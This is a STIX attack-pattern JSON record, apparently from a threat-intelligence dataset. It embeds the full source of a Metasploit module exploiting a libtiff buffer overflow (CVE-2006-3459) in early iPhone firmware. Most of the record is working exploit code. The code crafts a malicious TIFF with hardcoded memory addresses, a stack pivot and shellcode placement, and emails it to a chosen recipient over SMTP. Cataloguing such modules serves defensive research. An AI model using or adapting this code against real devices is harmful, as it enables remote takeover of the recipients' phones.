{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aeb0a76b-dd38-40c3-a76b-68aec910898b",
    "created": "2024-08-14T16:34:05.252729Z",
    "modified": "2024-08-14T16:34:05.252733Z",
    "name": "Apple iOS MobileMail LibTIFF Buffer Overflow",
    "description": " This module exploits a buffer overflow in the version of libtiff shipped with firmware versions 1.00, 1.01, 1.02, and 1.1.1 of the Apple iPhone. iPhones which have not had the BSD tools installed will need to use a special payload.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/apple_ios/email/mobilemail_libtiff.rb",
            "external_id": "mobilemail_libtiff.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-3459"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  #\n  # This module sends email messages via smtp\n  #\n  include Msf::Exploit::Remote::SMTPDeliver\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple iOS MobileMail LibTIFF Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the version of\n        libtiff shipped with firmware versions 1.00, 1.01, 1.02, and\n        1.1.1 of the Apple iPhone. iPhones which have not had the BSD\n        tools installed will need to use a special payload.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>  ['hdm', 'kf'],\n      'References'     =>\n        [\n          ['CVE', '2006-3459'],\n          ['OSVDB', '27723'],\n          ['BID', '19283']\n        ],\n      'Stance'         => Msf::Exploit::Stance::Passive,\n      'Payload'        =>\n        {\n          'Space'    => 1800,\n          'BadChars' => \"\",\n          'Compat'   =>\n            {\n              'ConnectionType' => '-bind -find',\n            },\n        },\n      'Arch'           => ARCH_ARMLE,\n      'Platform'       => %w{ osx },\n      'Targets'        =>\n        [\n\n          [ 'MobileSafari iPhone Mac OS X (1.00, 1.01, 1.02, 1.1.1)',\n            {\n              'Platform' => 'osx',\n\n              # Scratch space for our shellcode and stack\n              'Heap'     => 0x00802000,\n\n              # Deep inside _swap_m88110_thread_state_impl_t() libSystem.dylib\n              'Magic'    => 0x300d562c,\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-08-01'\n      ))\n\n  end\n\n  def autofilter\n    false\n  end\n\n  def exploit\n\n    exts = ['jpg', 'tiff', 'tif']\n\n    gext =  exts[rand(exts.length)]\n    name = rand_text_alpha(rand(10)+1) + \".#{gext}\"\n    data = Rex::Text.rand_text_alpha(rand(32)+1)\n    tiff = generate_tiff(target)\n\n    msg = Rex::MIME::Message.new\n    msg.mime_defaults\n    msg.subject = datastore['SUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)\n    msg.to = datastore['MAILTO']\n    msg.from = datastore['MAILFROM']\n\n    msg.add_part(Rex::Text.encode_base64(data, \"\\r\\n\"), \"text/plain\", \"base64\", \"inline\")\n    msg.add_part_attachment(tiff, rand_text_alpha(rand(32)+1) + \".\" + gext)\n\n    send_message(msg.to_s)\n\n    print_status(\"Waiting for a payload session (backgrounding)...\")\n  end\n\n  def generate_tiff(targ)\n    #\n    # This is a TIFF file, we have a huge range of evasion\n    # capabilities, but for now, we don't use them.\n    #  - https://strikecenter.bpointsys.com/articles/2007/10/10/october-2007-microsoft-tuesday\n    #\n\n    lolz = 2048\n    tiff =\n      \"\\x49\\x49\\x2a\\x00\\x1e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x01\\x03\\x00\"+\n      \"\\x01\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x01\\x01\\x03\\x00\"+\n      \"\\x01\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x03\\x01\\x03\\x00\"+\n      \"\\x01\\x00\\x00\\x00\\xaa\\x00\\x00\\x00\\x06\\x01\\x03\\x00\"+\n      \"\\x01\\x00\\x00\\x00\\xbb\\x00\\x00\\x00\\x11\\x01\\x04\\x00\"+\n      \"\\x01\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x17\\x01\\x04\\x00\"+\n      \"\\x01\\x00\\x00\\x00\\x15\\x00\\x00\\x00\\x1c\\x01\\x03\\x00\"+\n      \"\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x50\\x01\\x03\\x00\"+\n      [lolz].pack(\"V\") +\n      \"\\x84\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n    # Randomize the bajeezus out of our data\n    hehe = rand_text(lolz)\n\n    # Were going to candy mountain!\n    hehe[120, 4] = [targ['Magic']].pack(\"V\")\n\n    # >> add r0, r4, #0x30\n    hehe[104, 4] = [ targ['Heap'] - 0x30 ].pack(\"V\")\n\n    # Candy mountain, Charlie!\n    # >> mov r1, sp\n\n    # It will be an adventure!\n    # >> mov r2, r8\n    hehe[ 92, 4] = [ hehe.length ].pack(\"V\")\n\n    # Its a magic leoplurodon!\n    # It has spoken!\n    # It has shown us the way!\n    # >> bl _memcpy\n\n    # Its just over this bridge, Charlie!\n    # This magical bridge!\n    # >> ldr r3, [r4, #32]\n    # >> ldrt r3, [pc], r3, lsr #30\n    # >> str r3, [r4, #32]\n    # >> ldr r3, [r4, #36]\n    # >> ldrt r3, [pc], r3, lsr #30\n    # >> str r3, [r4, #36]\n    # >> ldr r3, [r4, #40]\n    # >> ldrt r3, [pc], r3, lsr #30\n    # >> str r3, [r4, #40]\n    # >> ldr r3, [r4, #44]\n    # >> ldrt r3, [pc], r3, lsr #30\n    # >> str r3, [r4, #44]\n\n    # We made it to candy mountain!\n    # Go inside Charlie!\n    # sub sp, r7, #0x14\n    hehe[116, 4] = [ targ['Heap'] + 44 + 0x14 ].pack(\"V\")\n\n    # Goodbye Charlie!\n    # ;; targ['Heap'] + 0x48 becomes the stack pointer\n    # >> ldmia sp!, {r8, r10}\n\n    # Hey, what the...!\n    # >> ldmia sp!, {r4, r5, r6, r7, pc}\n\n    # Return back to the copied heap data\n    hehe[192, 4] = [  targ['Heap'] + 196  ].pack(\"V\")\n\n    # Insert our actual shellcode at heap location + 196\n    hehe[196, payload.encoded.length] = payload.encoded\n\n    tiff << hehe\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-08-01",
    "x_mitre_platforms": [
        "osx'"
    ]
}